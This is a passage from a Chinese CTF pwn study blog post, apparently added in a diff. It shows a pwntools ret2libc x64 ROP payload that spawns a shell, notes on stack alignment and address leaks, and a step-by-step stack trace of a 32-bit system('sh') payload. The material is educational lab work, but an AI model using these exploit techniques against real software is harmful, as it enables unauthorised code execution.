======</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;ret2libc3_x64\n&quot;)</span><br><span class="line"></span><br><span class="line">payload2 = b&quot;a&quot; * (0x108)</span><br><span class="line">payload2 += p64(rdi) + p64(binsh)</span><br><span class="line">payload2 += p64(ret_gadget)</span><br><span class="line">payload2 += p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>对于payload2由于考虑堆栈平衡，所以会有两个ret指令放在一起</p>
+<p>payload2 +&#x3D; p64(rdi) + p64(binsh)<br>payload2 +&#x3D; p64(ret_gadget)</p>
+<h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>64位程序中，函数调用前，<strong>栈指针（rsp）必须是 16 字节对齐的</strong> </p>
+<p>32位程序中，函数调用前后，栈指针 <code>esp</code> 的值应该保持不变（32位一般不考虑堆栈平衡）</p>
+<p><strong>✅ 一、静态分析：计算栈偏移</strong></p>
+<p>为了栈对齐（避免崩溃），你构造的 payload 中“除了填充部分”之外的内容（即 gadget 和参数）最好是一个偶数块（8 字节为一块）</p>
+<p><strong>✅ 二、动态调试：使用 GDB 查看 <code>rsp</code> 的值</strong></p>
+<p>对于这一题来说，在确定了libc.so库和libc基址之后，在system函数内在system处设置断点</p>
+<p>之后运行这个脚本</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250716102357535.png"  alt="image-20250716102357535"></p>
+<p>这里就选择好libc版本了</p>
+<p>之后动态调试查看</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250717160428491.png"  alt="image-20250717160428491"></p>
+<p>在刚进入这个函数的第一步，就已经处于不平衡的状态了</p>
+<p>因为它在调用前是栈平衡，调用时会有push rsp 指令改变</p>
+<p>查看栈顶的命令是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info register rsp</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>对于构造的rop链</p>
+<h3 id="填充返回地址"><a href="#填充返回地址" class="headerlink" title="填充返回地址"></a><strong>填充返回地址</strong></h3><table>
+<thead>
+<tr>
+<th>填充的返回地址</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>main()</code></td>
+<td>让程序重新运行 main 函数（可重复利用）</td>
+</tr>
+<tr>
+<td><code>_start</code></td>
+<td>重新开始整个程序</td>
+</tr>
+<tr>
+<td>shellcode 地址</td>
+<td>如果你想继续执行自己的代码</td>
+</tr>
+<tr>
+<td><code>exit()</code>或<code>_exit()</code></td>
+<td>安全退出程序</td>
+</tr>
+</tbody></table>
+<p>返回地址写0的时候偶尔会报错</p>
+<h3 id="返回地址处理"><a href="#返回地址处理" class="headerlink" title="返回地址处理"></a>返回地址处理</h3><p><strong>🎯 2. 32 位 vs 64 位地址</strong></p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>32 位</th>
+<th>64 位</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>地址长度（位）</td>
+<td>32 位 &#x3D; 4 字节</td>
+<td>64 位 &#x3D; 8 字节</td>
+</tr>
+<tr>
+<td>Python 里的表示</td>
+<td>0xdeadbeef</td>
+<td>0x7fffdeadbeef</td>
+</tr>
+<tr>
+<td>打包函数</td>
+<td><code>p32()</code></td>
+<td><code>p64()</code></td>
+</tr>
+<tr>
+<td>解包函数</td>
+<td><code>u32()</code></td>
+<td><code>u64()</code></td>
+</tr>
+</tbody></table>
+<p>32位接收</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak = p.recv(4)      # 32位泄露一般是4字节</span><br><span class="line">addr = u32(leak)      # 转成 int</span><br></pre></td></tr></table></figure>
+
+<p>64位接收</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak = p.recv(6)              # 通常能收到6字节，有时候高两字节是0</span><br><span class="line">addr = u64(leak.ljust(8, b&#x27;\x00&#x27;))  # 补成8字节再解包</span><br></pre></td></tr></table></figure>
+
+<p><code>ljust(length, fillchar)</code> 会将当前的字节串 <code>leak</code> <strong>左对齐</strong>到指定的 <code>length</code>（这里是 8 字节），并使用 <code>fillchar</code>（这里是 <code>b&#39;\x00&#39;</code>，即空字节）从<strong>右侧</strong>进行填充。</p>
+<h3 id="查看调用函数的传递的参数"><a href="#查看调用函数的传递的参数" class="headerlink" title="查看调用函数的传递的参数"></a><strong>查看调用函数的传递的参数</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250718122316108.png"  alt="image-20250718122316108"></p>
+<p><strong>1. 初始状态（执行 <code>ret</code> 前）</strong></p>
+<p>假设此时栈布局如下（根据你的 payload）：</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>栈内存布局</strong>：</p>
+<p>text</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x80484d0          （覆盖的返回地址，指向 system@plt）</span><br><span class="line">esp + 4    -&gt; 0x08048722         （伪造的返回地址）</span><br><span class="line">esp + 8    -&gt; 0x080482ea         （参数 &quot;sh&quot; 的地址）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>寄存器状态</strong>：</p>
+<ul>
+<li><code>eip</code>：指向 <code>GetFlag+90</code> 的 <code>ret</code> 指令。</li>
+<li><code>esp</code>：指向栈顶 <code>0x80484d0</code>。</li>
+</ul>
+</li>
+</ul>
+<p><strong>2. 执行 <code>ret</code> 指令</strong></p>
+<p><code>ret</code> 等价于 <code>pop eip</code>，具体操作：</p>
+<ol>
+<li><p><strong>从栈顶弹出返回地址到 <code>eip</code></strong>：</p>
+<ul>
+<li><code>eip = [esp]</code> → <code>eip = 0x80484d0</code>（跳转到 <code>system@plt</code>）。</li>
+<li><code>esp = esp + 4</code> → 栈指针上升 4 字节。</li>
+</ul>
+</li>
+<li><p><strong>栈变化</strong>：</p>
+<p>text</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x08048722         （原 esp + 4）</span><br><span class="line">esp + 4    -&gt; 0x080482ea         （参数 &quot;sh&quot;）</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>3. 进入 <code>system@plt</code> 后的流程</strong></p>
+<p>(1) 首次调用 <code>system@plt</code>（GOT 未解析）</p>
+<p><code>system@plt</code> 的代码：</p>
+<p>asm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x80484d0 &lt;system@plt&gt;    jmp    [0x804a024]   ; 跳转到 GOT 表（首次指向下一行）</span><br><span class="line">0x80484d6 &lt;system@plt+6&gt;  push   0x30          ; 重定位偏移</span><br><span class="line">0x80484db &lt;system@plt+11&gt; jmp    0x8048460     ; 跳转到动态链接器</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong><code>jmp [0x804a024]</code></strong>：</p>
+<ul>
+<li>首次调用时，GOT 表 <code>0x804a024</code> 中的值为 <code>0x80484d6</code>（即 <code>system@plt+6</code>），因此继续执行下一条指令。</li>
+</ul>
+</li>
+<li><p><strong><code>push 0x30</code></strong>：</p>
+<ul>
+<li><p><code>esp = esp - 4</code> → 栈指针下降 4 字节。</p>
+</li>
+<li><p><code>[esp] = 0x30</code> → 将 <code>0x30</code> 压栈。</p>
+</li>
+<li><p><strong>栈变化</strong>：</p>
+<p>text</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x30               （新压入的值）</span><br><span class="line">esp + 4    -&gt; 0x08048722         （伪造的返回地址）</span><br><span class="line">esp + 8    -&gt; 0x080482ea         （参数 &quot;sh&quot;）</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong><code>jmp 0x8048460</code></strong>：</p>
+<ul>
+<li>跳转到动态链接器（<code>_dl_runtime_resolve</code>），解析 <code>system</code> 的真实地址并更新 GOT 表。</li>
+<li>*(2) 动态链接器解析完成后</li>
+</ul>
+</li>
+<li><p>动态链接器会将 <code>system</code> 的真实地址写入 GOT 表 <code>0x804a024</code>。</p>
+</li>
+<li><p>后续跳转到 <code>system</code> 的真实代码。</p>
+</li>
+</ul>
+<p><strong>4. 执行 <code>system</code> 函数时</strong></p>
+<p><strong>(1) <code>system</code> 的调用约定（cdecl）</strong></p>
+<ul>
+<li><p><strong>参数通过栈传递</strong>：</p>
+<ul>
+<li><code>call system</code> 会隐式压入返回地址（但你的漏洞利用直接跳转到 <code>system@plt</code>，未通过 <code>call</code>）。</li>
+<li>参数位于 <code>esp + 4</code>（因为 <code>esp</code> 指向返回地址）。</li>
+</ul>
+</li>
+<li><p><strong>你的场景</strong>：</p>
+<ul>
+<li><p>动态链接器解析完成后，直接跳转到 <code>system</code> 的真实代码。</p>
+</li>
+<li><p>此时栈布局：</p>
+<p>text</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x08048722         （伪造的返回地址）</span><br><span class="line">esp + 4    -&gt; 0x080482ea         （参数 &quot;sh&quot;）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>system</code> 会从 <code>esp + 4</code> 读取参数（即 <code>0x080482ea</code>），执行 <code>system(&quot;sh&quot;)</code>。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>(2) <code>system</code> 执行后的栈平衡</strong></p>
+<ul>
+<li>如果是正常 <code>call system</code>，调用者需通过 <code>add esp, 4</code> 清理参数。</li>
+<li>但你的漏洞利用中：<ul>
+<li>通过 <code>ret</code> 跳转到 <code>system@plt</code>，未显式使用 <code>call</code>。</li>
+<li><code>system</code> 执行完毕后会返回到 <code>0x08048722</code>（伪造的地址）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>5. 全程 <code>esp</code> 变化总结</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">步骤</th>
+<th align="left"><code>esp</code> 变化</th>
+<th align="left">栈布局（栈顶向下）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">执行 <code>ret</code> 前</td>
+<td align="left"><code>esp</code> → <code>0x80484d0</code></td>
+<td align="left"><code>[0x80484d0, 0x08048722, 0x080482ea]</code></td>
+</tr>
+<tr>
+<td align="left">执行 <code>ret</code></td>
+<td align="left"><code>esp += 4</code> → <code>0x08048722</code></td>
+<td align="left"><code>[0x08048722, 0x080482ea]</code></td>
+</tr>
+<tr>
+<td align="left"><code>system@plt</code> 中 <code>push 0x30</code></td>
+<td align="left"><code>esp -= 4</code> → <code>0x30</code></td>
+<td align="left"><code>[0x30, 0x08048722, 0x080482ea]</code></td>
+</tr>
+<tr>
+<td align="left">动态链接器解析完成</td>
+<td align="left"><code>esp</code> 恢复为 <code>0x08048722</code></td>
+<td align="left"><code>[0x08048722, 0x080482ea]</code></td>
+</tr>
+<tr>
+<td align="left"><code>system</code> 读取参数</td>
+<td align="left">从 <code>esp + 4</code> 读取 <code>0x080482ea</code></td>
+<td align="left">参数 <code>&quot;sh&quot;</code> 被正确传递</td>
+</tr>
+</tbody></table>
+<p><strong>6. 关键结论</strong></p>
+<ol>
+<li><strong><code>ret</code> 直接修改 <code>eip</code> 和 <code>esp</code></strong>：<ul>
+<li>通过弹出返回地址实现控制流劫持，<code>esp</code> 会 <strong>+4</strong>。</li>
+</ul>
+</li>
+<li><strong><code>system</code> 的参数传递依赖栈布局</strong>：<ul>
+<li>确保 <code>ret</code> 后，<code>esp + 4</code> 指向参数地址（你的 payload 已满足）。</li>
+</ul>
+</li>
+<li><strong>动态链接的额外栈操作</strong>：<ul>
+<li>首次调用 PLT 时会有 <code>push 0x30</code>，<code>esp</code> 会 <strong>-4</strong>，但最终不影响参数位置。</li>
+</ul>
+</li>
+</ol>
+<p>通过控制 <code>ret</code> 后的栈布局，你成功将 <code>&quot;sh&quot;</code> 传递给 <code>system</code>，最终获取 shell。</p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/07/10/picoCTF2022/"
+                                   title="picoCTF2022"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">picoCTF2022</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/06/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
+                                   title="bin"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">bin</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fun-a-b-%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">fun(a,b)调用过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BF%9D%E6%8A%A4"><span class="nav-number">2.</span> <span class="nav-text">Linux操作系统的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text-%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">3.</span> <span class="nav-text">ret2text(覆盖返回地址)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">3.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode%EF%BC%88%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%88%B0Shellcode%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">ret2shellcode（覆盖返回地址到Shellcode）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-number">4.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop"><span class="nav-number">5.</span> <span class="nav-text">rop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc1%EF%BC%88%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84rop%E6%9D%A5%E9%93%BE%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">ret2libc1（单个函数的rop来链）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-2"><span class="nav-number">5.1.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2-%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84rop%E9%93%BE"><span class="nav-number">5.2.</span> <span class="nav-text">ret2libc2(两个函数的rop链)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-3"><span class="nav-number">5.2.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2-%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84rop%E9%93%BE"><span class="nav-number">5.3.</span> <span class="nav-text">ret2libc2(多个函数的rop链)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-4"><span class="nav-number">5.3.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2syscall-%E5%BA%95%E5%B1%82%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E9%9D%99%E6%80%81"><span class="nav-number">5.4.</span> <span class="nav-text">ret2syscall(底层系统调用静态)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-5"><span class="nav-number">5.4.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">5.5.</span> <span class="nav-text">函数调用和系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E7%9F%A5%E8%AF%86"><span class="nav-number">5.5.1.</span> <span class="nav-text">编译知识</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc3"><span class="nav-number">5.6.</span> <span class="nav-text">ret2libc3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-6"><span class="nav-number">5.6.1.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E5%A4%9A%E4%B8%AAlibc-so%E7%89%88%E6%9C%AC%E4%BE%9B%E9%80%89%E6%8B%A9"><span class="nav-number">5.6.2.</span> <span class="nav-text">解决多个libc.so版本供选择</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%94%81-%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94%EF%BC%88%E9%87%8D%E7%82%B9%E6%9D%A5%E4%BA%86%EF%BC%81%EF%BC%89"><span class="nav-number">5.6.3.</span> <span class="nav-text">🔁 总结对比（重点来了！）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc3-x64"><span class="nav-number">5.7.</span> <span class="nav-text">ret2libc3_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-7"><span class="nav-number">5.7.1.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1"><span class="nav-number">5.7.2.</span> <span class="nav-text">堆栈平衡</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F"><span class="nav-number">6.</span> <span class="nav-text">注意</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A1%AB%E5%85%85%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">6.1.</span> <span class="nav-text">填充返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%A4%84%E7%90%86"><span class="nav-number">6.2.</span> <span class="nav-text">返回地址处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0"><span class="nav-number">6.3.</span> <span class="nav-text">查看调用函数的传递的参数</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fun-a-b-%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">fun(a,b)调用过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BF%9D%E6%8A%A4"><span class="nav-number">2.</span> <span class="nav-text">Linux操作系统的保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text-%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">3.</span> <span class="nav-text">ret2text(覆盖返回地址)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">3.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode%EF%BC%88%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%88%B0Shellcode%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">ret2shellcode（覆盖返回地址到Shellcode）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-number">4.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop"><span class="nav-number">5.</span> <span class="nav-text">rop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc1%EF%BC%88%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84rop%E6%9D%A5%E9%93%BE%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">ret2libc1（单个函数的rop来链）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-2"><span class="nav-number">5.1.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2-%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84rop%E9%93%BE"><span class="nav-number">5.2.</span> <span class="nav-text">ret2libc2(两个函数的rop链)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-3"><span class="nav-number">5.2.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc2-%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84rop%E9%93%BE"><span class="nav-number">5.3.</span> <span class="nav-text">ret2libc2(多个函数的rop链)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-4"><span class="nav-number">5.3.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2syscall-%E5%BA%95%E5%B1%82%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E9%9D%99%E6%80%81"><span class="nav-number">5.4.</span> <span class="nav-text">ret2syscall(底层系统调用静态)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-5"><span class="nav-number">5.4.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">5.5.</span> <span class="nav-text">函数调用和系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E7%9F%A5%E8%AF%86"><span class="nav-number">5.5.1.</span> <span class="nav-text">编译知识</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc3"><span class="nav-number">5.6.</span> <span class="nav-text">ret2libc3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-6"><span class="nav-number">5.6.1.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 